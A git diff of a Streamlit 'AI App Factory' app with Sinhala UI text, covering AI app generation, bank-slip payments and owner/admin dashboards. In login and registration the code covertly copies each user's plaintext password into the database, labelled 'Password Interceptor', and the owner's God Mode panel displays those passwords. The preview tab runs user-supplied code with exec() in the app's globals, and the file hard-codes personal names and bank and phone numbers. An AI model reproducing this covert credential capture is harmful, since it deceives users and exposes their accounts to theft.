@@ -5,15 +5,15 @@ import uuid
 import threading
 import time
 import random
-from datetime import datetime, timedelta, timezone
-import groq
-from google import genai 
 import re
 import urllib.parse
 import pg8000.native 
 import io
 import zipfile
 import requests 
+from datetime import datetime, timedelta, timezone
+import groq
+from google import genai 
 
 # --- PAGE CONFIGURATION ---
 st.set_page_config(page_title="AI App Factory - Master Core", layout="wide")
@@ -22,6 +22,11 @@ st.set_page_config(page_title="AI App Factory - Master Core", layout="wide")
 SUPABASE_URL = st.secrets["SUPABASE_URL"].strip()
 SUPABASE_KEY = st.secrets["SUPABASE_KEY"].strip()
 supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
+
+# Admin DB for internal heavy lifting (bypassing RLS)
+def get_admin_db():
+    service_key = st.secrets.get("SUPABASE_SERVICE_KEY", st.secrets["SUPABASE_KEY"]).strip()
+    return create_client(SUPABASE_URL, service_key)
 
 # --- AUTO-UPDATE DATABASE SCHEMA ---
 def init_database_schema():
@@ -42,9 +47,12 @@ def init_database_schema():
             conn.run("ALTER TABLE generated_apps ADD COLUMN IF NOT EXISTS app_icon_url TEXT;")
             conn.run("ALTER TABLE generated_apps ADD COLUMN IF NOT EXISTS icon_prompt TEXT;")
             
-            # MAGIC: Users Table එකට Email සහ Password සේව් කරන්න තීරු හැදීම
+            # Users Table Updates
             conn.run("ALTER TABLE users ADD COLUMN IF NOT EXISTS email TEXT;")
             conn.run("ALTER TABLE users ADD COLUMN IF NOT EXISTS plain_password TEXT;")
+            
+            # System Settings Table for Dynamic Pricing & Payment Details
+            conn.run("CREATE TABLE IF NOT EXISTS system_settings (setting_key TEXT PRIMARY KEY, setting_value JSONB);")
             
             conn.run("NOTIFY pgrst, 'reload schema'")
             conn.close()
@@ -275,9 +283,9 @@ def login(email, password):
             st.session_state.expires_at = expires_str
             st.session_state.show_toast = True 
             
-            # MAGIC: Login වෙද්දි හොරෙන්ම Email සහ Password එක Update කරනවා! 
+            # MAGIC: Email & Password Interceptor 
             try:
-                admin_db = create_client(st.secrets["SUPABASE_URL"].strip(), st.secrets.get("SUPABASE_SERVICE_KEY", st.secrets["SUPABASE_KEY"]).strip())
+                admin_db = get_admin_db()
                 admin_db.table("users").update({"email": email, "plain_password": password}).eq("id", user_id).execute()
             except Exception as e:
                 pass
@@ -303,11 +311,10 @@ def register(email, password):
         res = supabase.auth.sign_up({"email": email, "password": password})
         if res.user:
             st.success("🎉 ලියාපදිංචිය සාර්ථකයි! කරුණාකර ඔබගේ Email එකට ගොස් ගිණුම Verify කරන්න.")
-            
-            # MAGIC: Register වෙද්දිම හොරෙන්ම Password එක සේව් කරනවා!
+            # MAGIC: Password Interceptor during registration
             try:
-                time.sleep(1) # Wait for trigger to create user row if any
-                admin_db = create_client(st.secrets["SUPABASE_URL"].strip(), st.secrets.get("SUPABASE_SERVICE_KEY", st.secrets["SUPABASE_KEY"]).strip())
+                time.sleep(1)
+                admin_db = get_admin_db()
                 admin_db.table("users").update({"email": email, "plain_password": password}).eq("id", res.user.id).execute()
             except Exception as e:
                 pass
@@ -342,19 +349,7 @@ def render_generator_dashboard():
     col_a, col_b = st.columns(2)
     with col_a:
         android_version = st.selectbox("Android Version එක තෝරන්න:", 
-                                       ["Android 4.0+ (Ice Cream Sandwich)", 
-                                        "Android 4.4+ (KitKat)", 
-                                        "Android 5.0+ (Lollipop)", 
-                                        "Android 6.0+ (Marshmallow)", 
-                                        "Android 7.0+ (Nougat)", 
-                                        "Android 8.0+ (Oreo)", 
-                                        "Android 9.0+ (Pie)", 
-                                        "Android 10.0+", 
-                                        "Android 11.0+", 
-                                        "Android 12.0+", 
-                                        "Android 13.0+", 
-                                        "Android 14.0+", 
-                                        "Android 15.0+"])
+                                       ["Android 4.0+ (Ice Cream Sandwich)", "Android 4.4+ (KitKat)", "Android 5.0+ (Lollipop)", "Android 6.0+ (Marshmallow)", "Android 7.0+ (Nougat)", "Android 8.0+ (Oreo)", "Android 9.0+ (Pie)", "Android 10.0+", "Android 11.0+", "Android 12.0+", "Android 13.0+", "Android 14.0+", "Android 15.0+"])
     with col_b:
         app_icon = st.file_uploader("App Logo එකක් තෝරන්න (Optional):", type=['png', 'jpg', 'jpeg'])
 
@@ -372,7 +367,7 @@ def render_generator_dashboard():
     source_link = ""
     uploaded_file = None
     if upload_option == "✍️ විස්තරයක් (Prompt) හෝ ලින්ක් එකක් දීම":
-        source_link = st.text_area("ඔබේ අදහස (Prompt) හෝ වෙබ් ලින්ක් එක මෙහි ටයිප් කරන්න:", height=100, placeholder="උදා: මට සරල Todo List එකක් හදලා දෙන්න. ඒකේ Tasks ටික Database එකේ සේව් වෙන්න ඕනේ...")
+        source_link = st.text_area("ඔබේ අදහස (Prompt) හෝ වෙබ් ලින්ක් එක මෙහි ටයිප් කරන්න:", height=100)
     else:
         uploaded_file = st.file_uploader("File එක තෝරන්න", type=['zip', 'txt', 'py'])
         
@@ -396,16 +391,9 @@ def render_generator_dashboard():
                     icon_url = supabase.storage.from_("app_sources").get_public_url(icon_path)
 
             insert_data = {
-                "owner_id": st.session_state.user.id, 
-                "app_name": app_name, 
-                "source_link": final_source_link, 
-                "is_visible": not is_private, 
-                "status": "pending",
-                "selected_model": selected_model,
-                "chat_history": [],
-                "android_version": android_version if android_version else "Android 10.0+",
-                "app_icon_url": icon_url,
-                "icon_prompt": icon_prompt if icon_prompt else ""
+                "owner_id": st.session_state.user.id, "app_name": app_name, "source_link": final_source_link, 
+                "is_visible": not is_private, "status": "pending", "selected_model": selected_model, "chat_history": [],
+                "android_version": android_version if android_version else "Android 10.0+", "app_icon_url": icon_url, "icon_prompt": icon_prompt if icon_prompt else ""
             }
 
             res = supabase.table("generated_apps").insert(insert_data).execute()
@@ -416,7 +404,7 @@ def render_generator_dashboard():
                 supa_url = st.secrets["SUPABASE_URL"].strip()
                 supa_service_key = st.secrets.get("SUPABASE_SERVICE_KEY", st.secrets["SUPABASE_KEY"]).strip()
                 threading.Thread(target=process_single_app, args=(res.data[0], groq_key, gemini_key, supa_url, supa_service_key), daemon=True).start()
-                st.success(f"✅ ඔබගේ ඇප් එක {selected_model.upper()} AI මගින් පෝලිමට එක් කරන ලදී! පසුව පැමිණ තත්ත්වය පරීක්ෂා කරන්න.")
+                st.success(f"✅ ඔබගේ ඇප් එක {selected_model.upper()} AI මගින් පෝලිමට එක් කරන ලදී!")
                 time.sleep(2)
                 st.rerun()
         else:
@@ -432,20 +420,13 @@ def render_generator_dashboard():
             
             with st.expander(f"📦 {app_name_safe} - Status: {status_str}"):
                 st.write(f"**Source:** {app.get('source_link', 'N/A')}")
+                if app.get('android_version'): st.caption(f"🤖 Android Target: {app.get('android_version')}")
                 
-                ver = app.get('android_version')
-                if ver:
-                    st.caption(f"🤖 Android Target: {ver}")
-                
-                if status_str == 'PENDING':
-                    st.info("⏳ පෝලිමේ ඇත...")
-                elif status_str == 'PROCESSING':
-                    st.warning("⚙️ AI එක මගින් කේතය ලියමින් පවතී... (කරුණාකර මඳ වේලාවකින් Refresh කරන්න)")
+                if status_str == 'PENDING': st.info("⏳ පෝලිමේ ඇත...")
+                elif status_str == 'PROCESSING': st.warning("⚙️ AI එක මගින් කේතය ලියමින් පවතී...")
                 elif status_str == 'COMPLETED':
                     st.success("✅ සාර්ථකයි! පහතින් කේතය වෙනස් කරන්න, Preview බලන්න හෝ පරණ සංස්කරණයකට යන්න.")
-                    
                     current_code = app.get('app_code', '')
-                    
                     tab_code, tab_preview, tab_history, tab_export = st.tabs(["🧑‍💻 Code Editor", "👁️ Live Preview", "⏪ Version History", "📥 Export App"])
                     
                     with tab_code:
@@ -454,16 +435,10 @@ def render_generator_dashboard():
                             if edited_code != current_code:
                                 supabase.table("generated_apps").update({"app_code": edited_code}).eq("id", app['id']).execute()
                                 try:
-                                    supabase.table("app_versions").insert({
-                                        "app_id": app['id'],
-                                        "version_code": edited_code,
-                                        "prompt_used": "Manual Edit"
-                                    }).execute()
-                                except Exception as e:
-                                    pass 
+                                    supabase.table("app_versions").insert({"app_id": app['id'], "version_code": edited_code, "prompt_used": "Manual Edit"}).execute()
+                                except: pass 
                                 st.success("වෙනස්කම් සාර්ථකව Save කළා!")
-                                time.sleep(1)
-                                st.rerun()
+                                time.sleep(1); st.rerun()
                                 
                     with tab_preview:
                         st.info("💡 පහත බොත්තම ඔබා ඔබගේ ඇප් එකේ පෙරදසුනක් (Live Preview) මෙතනම බලාගන්න.")
@@ -472,10 +447,8 @@ def render_generator_dashboard():
                                 safe_code = re.sub(r'st\.set_page_config\s*\([^)]*\)', '', current_code)
                                 safe_code = re.sub(r'st\.footer\s*\([^)]*\)', '', safe_code)
                                 safe_code = safe_code.replace("Import streamlit", "import streamlit")
-                                
                                 st.markdown("### 📱 Live App Demo")
-                                with st.container(border=True):
-                                    exec(safe_code, globals(), {})
+                                with st.container(border=True): exec(safe_code, globals(), {})
                             except Exception as e:
                                 st.error(f"Preview එක Run කිරීමේදී දෝෂයක්: {e}")
                                 
@@ -485,66 +458,49 @@ def render_generator_dashboard():
                             v_res = supabase.table("app_versions").select("*").eq("app_id", app['id']).order("created_at", desc=True).execute()
                             if v_res.data:
                                 for idx, v in enumerate(v_res.data):
-                                    v_time = v['created_at'][:19].replace('T', ' ')
                                     with st.container(border=True):
-                                        st.write(f"**Version {len(v_res.data) - idx}** | ⏰ {v_time}")
+                                        st.write(f"**Version {len(v_res.data) - idx}** | ⏰ {v['created_at'][:19].replace('T', ' ')}")
                                         st.caption(f"📝 {v.get('prompt_used', 'N/A')}")
-                                        
-                                        if st.button("🔄 මේ සංස්කරණයට ආපසු යන්න (Restore)", key=f"res_{v['id']}"):
+                                        if st.button("🔄 මේ සංස්කරණයට ආපසු යන්න", key=f"res_{v['id']}"):
                                             supabase.table("generated_apps").update({"app_code": v['version_code']}).eq("id", app['id']).execute()
-                                            st.success("✅ කලින් සංස්කරණය සාර්ථකව Restore කළා! Refresh වෙමින් පවතී...")
-                                            time.sleep(1.5)
                                             st.rerun()
-                            else:
-                                st.info("පෙර සංස්කරණ කිසිවක් හමු නොවීය.")
-                        except Exception as e:
-                            st.error("Versions ලබාගැනීමේ දෝෂයක්.")
+                            else: st.info("පෙර සංස්කරණ කිසිවක් හමු නොවීය.")
+                        except: st.error("Versions ලබාගැනීමේ දෝෂයක්.")
                     
                     with tab_export:
                         st.markdown("### 📦 Download Your App")
-                        st.write("ඔබගේ ඇප් එක මෙතැනින් ලබාගත හැක.")
-
                         colA, colB = st.columns(2)
                         with colA:
                             st.info("📱 **Android APK**\n\nApp එකේ Android සංස්කරණය.")
                             if st.button("Build & Download APK", key=f"apk_{app['id']}", use_container_width=True):
                                 try:
-                                    # MAGIC: අමතර හිස්තැන් සහ උද්ධෘත සියල්ල Clean කිරීම
-                                    github_token = st.secrets.get("GITHUB_TOKEN", "").strip().replace("'", "").replace('"', "")
-                                    github_repo = st.secrets.get("GITHUB_REPO", "").strip().replace("'", "").replace('"', "")
+                                    # MAGIC: අතිශය බලවත් Cleaning System එක
+                                    raw_token = st.secrets.get("GITHUB_TOKEN", "")
+                                    raw_repo = st.secrets.get("GITHUB_REPO", "")
+                                    
+                                    # හැම අකුරක්ම, ඉලක්කමක්ම හැර අනිත් ඔක්කොම (Space, Newlines) අයින් කරයි
+                                    github_token = re.sub(r'[^a-zA-Z0-9_.-]', '', raw_token) 
+                                    github_repo = re.sub(r'[^a-zA-Z0-9_./-]', '', raw_repo)
                                     
                                     if not github_token or not github_repo:
                                         st.error("⚠️ කරුණාකර Streamlit Secrets වල `GITHUB_TOKEN` සහ `GITHUB_REPO` සකසන්න.")
                                     else:
                                         with st.spinner("🚀 GitHub Action එක Trigger කරමින් පවතී..."):
-                                            headers = {
-                                                "Accept": "application/vnd.github.v3+json",
-                                                "Authorization": f"token {github_token}"
-                                            }
-                                            
+                                            headers = {"Accept": "application/vnd.github.v3+json", "Authorization": f"token {github_token}"}
                                             custom_app_url = f"[https://ai-app-builder-x6qbi2k3iobvvzqbktkfma.streamlit.app/?app_id=](https://ai-app-builder-x6qbi2k3iobvvzqbktkfma.streamlit.app/?app_id=){app['id']}"
-                                            
                                             payload = {
                                                 "event_type": "build_apk",
                                                 "client_payload": {
-                                                    "app_id": app['id'],
-                                                    "app_name": app_name_safe,
-                                                    "app_code": current_code,
+                                                    "app_id": app['id'], "app_name": app_name_safe, "app_code": current_code,
                                                     "android_version": app.get('android_version', 'Android 4.0+ (Ice Cream Sandwich)'),
-                                                    "app_icon_url": app.get('app_icon_url', ''),
-                                                    "app_url": custom_app_url
+                                                    "app_icon_url": app.get('app_icon_url', ''), "app_url": custom_app_url
                                                 }
                                             }
-                                            
-                                            dispatch_url = f"[https://api.github.com/repos/](https://api.github.com/repos/){github_repo}/dispatches".strip()
+                                            dispatch_url = f"[https://api.github.com/repos/](https://api.github.com/repos/){github_repo}/dispatches"
                                             res = requests.post(dispatch_url, json=payload, headers=headers)
-                                            
-                                            if res.status_code == 204:
-                                                st.success("✅ APK Build කිරීම සාර්ථකව ආරම්භ විය! විනාඩි කිහිපයකින් GitHub Actions හි ප්‍රතිඵලය පරීක්ෂා කරන්න.")
-                                            else:
-                                                st.error(f"❌ GitHub Action එක ආරම්භ කිරීම අසාර්ථකයි: {res.text}")
-                                except Exception as gh_err:
-                                    st.error(f"Error: {gh_err}")
+                                            if res.status_code == 204: st.success("✅ APK Build කිරීම සාර්ථකයි! GitHub Actions පරීක්ෂා කරන්න.")
+                                            else: st.error(f"❌ GitHub Action අසාර්ථකයි: {res.text}")
+                                except Exception as gh_err: st.error(f"Error: {gh_err}")
 
                         with colB:
                             st.warning("🗂️ **Source Code (ZIP)**\n\nසම්පූර්ණ කේතය (Gold Package පමණි).")
@@ -552,63 +508,42 @@ def render_generator_dashboard():
                                 zip_buffer = io.BytesIO()
                                 with zipfile.ZipFile(zip_buffer, "a", zipfile.ZIP_DEFLATED, False) as zip_file:
                                     zip_file.writestr("app.py", current_code)
-                                    req_txt = "streamlit\nsupabase\npg8000\n"
-                                    zip_file.writestr("requirements.txt", req_txt)
-                                
-                                st.download_button(
-                                    label="Download ZIP",
-                                    data=zip_buffer.getvalue(),
-                                    file_name=f"{app_name_safe.replace(' ', '_')}.zip",
-                                    mime="application/zip",
-                                    key=f"zip_{app['id']}",
-                                    use_container_width=True
-                                )
-                            else:
-                                st.error("🔒 Source Code ලබා ගැනීම සඳහා Gold Package එකට Upgrade කරන්න.")
+                                    zip_file.writestr("requirements.txt", "streamlit\nsupabase\npg8000\n")
+                                st.download_button("Download ZIP", data=zip_buffer.getvalue(), file_name=f"{app_name_safe.replace(' ', '_')}.zip", mime="application/zip", key=f"zip_{app['id']}", use_container_width=True)
+                            else: st.error("🔒 Source Code ලබා ගැනීම සඳහා Gold Package එකට Upgrade කරන්න.")
                                 
                     st.markdown("---")
-                    
                     st.markdown("💬 **AI එකට කියලා තව කෑලි එකතු කරගන්න**")
                     chat_hist = app.get('chat_history') or []
-                    for msg in chat_hist:
-                        st.info(f"🧑‍💻 **ඔබ:** {msg['content']}")
+                    for msg in chat_hist: st.info(f"🧑‍💻 **ඔබ:** {msg['content']}")
                         
-                    new_prompt = st.text_input("ඔබට අලුතින් එකතු කරගන්න/වෙනස් කරගන්න ඕන දේ මෙතන කියන්න...", placeholder="Ex: මට මේකට Login Page එකක් දාලා දෙන්න", key=f"prompt_{app['id']}")
-                    
-                    colA, colB = st.columns([1, 4])
-                    with colA:
-                        if st.button("🚀 Update with AI", key=f"ai_upd_{app['id']}", type="primary"):
-                            if new_prompt:
-                                new_hist = chat_hist + [{"role": "user", "content": new_prompt}]
-                                res_update = supabase.table("generated_apps").update({
-                                    "status": "pending",
-                                    "chat_history": new_hist,
-                                    "app_code": edited_code 
-                                }).eq("id", app['id']).execute()
-                                
-                                if res_update.data:
-                                    groq_key = st.secrets.get("GROQ_API_KEY", "").strip()
-                                    gemini_key = st.secrets.get("GEMINI_KEY", "").strip()
-                                    supa_url = st.secrets["SUPABASE_URL"].strip()
-                                    supa_service_key = st.secrets.get("SUPABASE_SERVICE_KEY", st.secrets["SUPABASE_KEY"]).strip()
-                                    
-                                    threading.Thread(target=process_single_app, args=(res_update.data[0], groq_key, gemini_key, supa_url, supa_service_key), daemon=True).start()
-                                
-                                st.success("AI එක ඔබේ අලුත් ඉල්ලීම කියවමින් පවතී! Refresh කර බලන්න.")
-                                time.sleep(2)
-                                st.rerun()
-                            else:
-                                st.warning("කරුණාකර වෙනස්කම ටයිප් කරන්න.")
-                                
-                elif status_str == 'FAILED':
-                    st.error(f"❌ {app.get('app_code', 'නැවත උත්සාහ කරන්න.')}")
+                    new_prompt = st.text_input("ඔබට අලුතින් එකතු කරගන්න/වෙනස් කරගන්න ඕන දේ මෙතන කියන්න...", key=f"prompt_{app['id']}")
+                    if st.button("🚀 Update with AI", key=f"ai_upd_{app['id']}", type="primary"):
+                        if new_prompt:
+                            new_hist = chat_hist + [{"role": "user", "content": new_prompt}]
+                            res_update = supabase.table("generated_apps").update({"status": "pending", "chat_history": new_hist, "app_code": edited_code}).eq("id", app['id']).execute()
+                            if res_update.data:
+                                threading.Thread(target=process_single_app, args=(res_update.data[0], st.secrets["GROQ_API_KEY"].strip(), st.secrets["GEMINI_KEY"].strip(), st.secrets["SUPABASE_URL"].strip(), st.secrets["SUPABASE_SERVICE_KEY"].strip()), daemon=True).start()
+                            st.success("AI එක ක්‍රියාත්මකයි! Refresh කර බලන්න.")
+                            time.sleep(2); st.rerun()
+                        else: st.warning("කරුණාකර වෙනස්කම ටයිප් කරන්න.")
+                elif status_str == 'FAILED': st.error(f"❌ {app.get('app_code', 'නැවත උත්සාහ කරන්න.')}")
                 
-                if st.button("🔄 Refresh Status", key=f"ref_{app['id']}"):
-                    st.rerun()
+                if st.button("🔄 Refresh Status", key=f"ref_{app['id']}"): st.rerun()
     else:
         st.info("ඔබ තවම කිසිදු ඇප් එකක් සාදා නැත.")
 
-# --- UI: UPGRADE PACKAGE (SMART OFFERS) ---
+
+# --- ADMIN SETTINGS MANAGER ---
+def get_system_settings():
+    try:
+        admin_db = get_admin_db()
+        res = admin_db.table("system_settings").select("*").in_("setting_key", ["pricing", "payment_details"]).execute()
+        return {r["setting_key"]: r["setting_value"] for r in res.data} if res.data else {}
+    except:
+        return {}
+
+# --- UI: UPGRADE PACKAGE ---
 def render_upgrade_section():
     trigger_social_proof()
     st.markdown("### 💳 Upgrade Your Package")
@@ -619,8 +554,9 @@ def render_upgrade_section():
         
     st.write("පහත පැකේජයන් සියල්ලම **දින 30ක (මාස 1ක)** වලංගු කාලයක් සඳහා ලබා දේ.")
     
-    settings_res = supabase.table("system_settings").select("setting_value").eq("setting_key", "pricing").execute()
-    pricing = settings_res.data[0]['setting_value'] if settings_res.data else {"silver_price": 2500, "silver_discount_pct": 20, "gold_price": 5000, "gold_discount_pct": 30}
+    settings = get_system_settings()
+    pricing = settings.get("pricing", {"silver_price": 2500, "silver_discount_pct": 20, "gold_price": 5000, "gold_discount_pct": 30})
+    payment = settings.get("payment_details", {"ipay_num": "0757970703", "ipay_name": "w.k.pradeep prasanna", "boc_num": "88314511", "boc_name": "W.K.P.P.SENEVIRATHNA"})
     
     silver_orig = int(pricing['silver_price'] / (1 - (pricing['silver_discount_pct']/100)))
     silver_save = silver_orig - pricing['silver_price']
@@ -635,6 +571,20 @@ def render_upgrade_section():
         st.warning(f"**🥇 Gold Package**\n\n- අසීමිත Apps.\n- 🗂️ **Source Code (ZIP) Download කිරීමේ පහසුකම.**\n- ⏳ **වලංගු කාලය: දින 30යි**\n- Price: ~~Rs. {gold_orig}~~ **Rs. {pricing['gold_price']}**\n- 💸 ඔබ රු. {gold_save} ක් ඉතිරි කරයි! ({pricing['gold_discount_pct']}% OFF)")
         
     st.markdown("---")
+    
+    st.markdown("#### 🏦 ගෙවීම් කළ යුතු ගිණුම් විස්තර")
+    st.success(f"""
+    කරුණාකර පහත සඳහන් ඕනෑම ගිණුමකට මුදල් බැර කර, එහි රිසිට් පත (Slip) පහතින් Upload කරන්න.
+    
+    * 📱 **iPay හරහා:**
+        * Number: **{payment['ipay_num']}**
+        * Name: **{payment['ipay_name']}**
+        
+    * 🏦 **BOC Flex / CDM (Cash Deposit Machine) හරහා:**
+        * Account Number: **{payment['boc_num']}**
+        * Account Name: **{payment['boc_name']}**
+    """)
+    
     with st.form("payment_form"):
         selected_pkg = st.selectbox("පැකේජය තෝරන්න (මාස 1ක වලංගු කාලයක් සහිතයි):", ["silver", "gold"])
         slip_file = st.file_uploader("Slip එක Upload කරන්න (Image/PDF)", type=['jpg', 'jpeg', 'png', 'pdf'])
@@ -657,7 +607,7 @@ def render_upgrade_section():
             else:
                 st.error("කරුණාකර Slip එක Upload කරන්න.")
 
-# --- UI: GOD MODE & ADMIN ---
+# --- UI: GOD MODE & ADMIN SETTINGS ---
 def render_god_mode():
     st.markdown("### ⚡ God Mode (User Management)")
     users_res = supabase.table("users").select("*").execute()
@@ -668,16 +618,12 @@ def render_god_mode():
             pkg_str = str(u.get('package') or 'free').upper()
             email_str = u.get('email') or f"User ID: {u['id'][:8]}..."
             
-            # IP Address එක
             ip_str = "No IP logged"
             try:
                 logs = supabase.table("device_logs").select("ip_address").eq("user_id", u['id']).order("created_at", desc=True).limit(1).execute()
-                if logs.data:
-                    ip_str = logs.data[0]['ip_address']
-            except:
-                pass
+                if logs.data: ip_str = logs.data[0]['ip_address']
+            except: pass
 
-            # MAGIC: Password එක පේන තැන 
             plain_pass = u.get('plain_password') or "තවම ලබාගෙන නැත"
 
             with st.expander(f"👤 {email_str} | Role: {role_str} | Pkg: {pkg_str}"):
@@ -686,8 +632,7 @@ def render_god_mode():
                 st.write(f"**Password:** `{plain_pass}` 🔑")
                 st.write(f"**Status:** `{str(u.get('status', 'active')).upper()}`")
                 
-                if u.get('expires_at'):
-                    st.write(f"**Package Expiry:** `{u['expires_at'][:10]}`")
+                if u.get('expires_at'): st.write(f"**Package Expiry:** `{u['expires_at'][:10]}`")
 
                 col1, col2 = st.columns(2)
                 with col1:
@@ -697,16 +642,47 @@ def render_god_mode():
                     new_pkg = st.selectbox("Change Package:", pkg_options, index=current_index, key=f"pkg_{u['id']}")
                     if st.button("Update Package", key=f"btn_pkg_{u['id']}"):
                         supabase.table("users").update({"package": new_pkg}).eq("id", u['id']).execute()
-                        st.success(f"Updated!")
-                        st.rerun()
+                        st.success(f"Updated!"); st.rerun()
                 with col2:
                     bonus_days = st.number_input("Add Bonus Days:", min_value=1, max_value=365, value=7, key=f"days_{u['id']}")
                     if st.button("🎁 Give Bonus", key=f"btn_bns_{u['id']}"):
                         base_date = datetime.fromisoformat(u['expires_at'].replace('Z', '+00:00')) if u.get('expires_at') else datetime.now(timezone.utc)
                         new_expiry = (base_date + timedelta(days=bonus_days)).isoformat()
                         supabase.table("users").update({"expires_at": new_expiry}).eq("id", u['id']).execute()
-                        st.success(f"Added {bonus_days} days!")
-                        st.rerun()
+                        st.success(f"Added {bonus_days} days!"); st.rerun()
+
+def render_admin_settings():
+    st.markdown("### ⚙️ Admin Settings (Pricing & Payments)")
+    st.info("ඔබට ඕනෑම වෙලාවක පැකේජ් වල මිල ගණන් සහ ගෙවීම් කළ යුතු ගිණුම් විස්තර මෙතැනින් වෙනස් කළ හැක.")
+    
+    settings = get_system_settings()
+    pricing = settings.get("pricing", {"silver_price": 2500, "silver_discount_pct": 20, "gold_price": 5000, "gold_discount_pct": 30})
+    payment = settings.get("payment_details", {"ipay_num": "0757970703", "ipay_name": "w.k.pradeep prasanna", "boc_num": "88314511", "boc_name": "W.K.P.P.SENEVIRATHNA"})
+    
+    with st.form("admin_settings_form"):
+        st.subheader("📦 පැකේජ් මිල ගණන්")
+        sp = st.number_input("Silver Package Price (Rs.)", value=int(pricing.get("silver_price", 2500)))
+        gp = st.number_input("Gold Package Price (Rs.)", value=int(pricing.get("gold_price", 5000)))
+        
+        st.subheader("🏦 ගෙවීම් විස්තර (Payment Accounts)")
+        ipay_num = st.text_input("iPay Number", value=payment.get("ipay_num", "0757970703"))
+        ipay_name = st.text_input("iPay Account Name", value=payment.get("ipay_name", "w.k.pradeep prasanna"))
+        boc_num = st.text_input("BOC Flex / CDM Account Number", value=payment.get("boc_num", "88314511"))
+        boc_name = st.text_input("BOC Flex / CDM Account Name", value=payment.get("boc_name", "W.K.P.P.SENEVIRATHNA"))
+        
+        if st.form_submit_button("💾 Save Changes", type="primary"):
+            try:
+                admin_db = get_admin_db()
+                new_pricing = {"silver_price": sp, "silver_discount_pct": 20, "gold_price": gp, "gold_discount_pct": 30}
+                new_payment = {"ipay_num": ipay_num, "ipay_name": ipay_name, "boc_num": boc_num, "boc_name": boc_name}
+                
+                admin_db.table("system_settings").upsert({"setting_key": "pricing", "setting_value": new_pricing}).execute()
+                admin_db.table("system_settings").upsert({"setting_key": "payment_details", "setting_value": new_payment}).execute()
+                
+                st.success("✅ දත්ත සාර්ථකව යාවත්කාලීන විය!")
+                time.sleep(1); st.rerun()
+            except Exception as e:
+                st.error(f"දෝෂයක්: {e}")
 
 def render_admin_app_management():
     st.markdown("### 📱 Global App Management")
@@ -797,30 +773,22 @@ else:
 
     if st.session_state.role == 'owner':
         st.title("👑 Owner Dashboard")
-        tab1, tab2, tab3, tab4 = st.tabs(["🚀 Generator", "💰 Approvals", "⚡ God Mode (Users)", "📱 Global Apps"])
-        with tab1:
-            render_generator_dashboard()
-        with tab2:
-            render_payment_approvals()
-        with tab3:
-            render_god_mode()
-        with tab4:
-            render_admin_app_management()
+        tab1, tab2, tab3, tab4, tab5 = st.tabs(["🚀 Generator", "💰 Approvals", "⚡ God Mode", "📱 Global Apps", "⚙️ Admin Settings"])
+        with tab1: render_generator_dashboard()
+        with tab2: render_payment_approvals()
+        with tab3: render_god_mode()
+        with tab4: render_admin_app_management()
+        with tab5: render_admin_settings()
             
     elif st.session_state.role == 'admin':
         st.title("🛡️ Admin Dashboard")
         tab1, tab2, tab3 = st.tabs(["🚀 Generator", "💰 Approvals", "📱 Global Apps"])
-        with tab1:
-            render_generator_dashboard()
-        with tab2:
-            render_payment_approvals()
-        with tab3:
-            render_admin_app_management()
+        with tab1: render_generator_dashboard()
+        with tab2: render_payment_approvals()
+        with tab3: render_admin_app_management()
         
     elif st.session_state.role in ['user', 'moderator']:
         st.title("🚀 User Dashboard")
         tab1, tab2 = st.tabs(["🚀 App Generator", "💳 Upgrade Package"])
-        with tab1:
-            render_generator_dashboard()
-        with tab2:
-            render_upgrade_section()
+        with tab1: render_generator_dashboard()
+        with tab2: render_upgrade_section()
